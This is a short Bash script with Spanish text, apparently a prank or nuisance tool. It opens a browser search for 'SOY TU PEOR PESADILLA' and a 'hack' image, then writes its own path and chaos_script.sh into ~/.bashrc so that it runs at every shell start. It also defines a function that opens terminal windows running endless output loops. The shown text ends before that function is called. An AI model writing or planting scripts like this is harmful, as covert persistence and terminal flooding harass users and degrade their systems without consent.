#!/bin/bash
NOMBRE="SOY TU PEOR PESADILLA"
xdg-open "https://www.google.com/search?q=${NOMBRE}"
HACK_IMAGE="https://i.imgur.com/EsnPdi3.jpg"
sleep 2
xdg-open "${HACK_IMAGE}"
#chmod +x open_google.sh
echo "$(pwd)/open_google.sh" >> ~/.bashrc

if ! grep -q "$(pwd)/chaos_script.sh" ~/.bashrc; then
    echo "$(pwd)/chaos_script.sh" >> ~/.bashrc
fi

HORA=$(date +"%H%M")

NUM_TERMINALES=5

ESCRITORIO="$HOME/Escritorio"

FONDO_TEMPORAL="/tmp/hack_background.jpg"

launch_terminal() {
  gnome-terminal -- bash -c "
  echo '🔥 Modo caos activado 🔥';
  echo 'Multiplicando la hora ($HORA) infinitamente...';

  while true; do
    NUM=\$((RANDOM % 100 + 1))  # Número aleatorio entre 1 y 100
    RESULT=\$((HORA * NUM))
    echo \"$HORA x \$NUM = \$RESULT\";
    sleep 0.1;
  done
  exec bash"
}
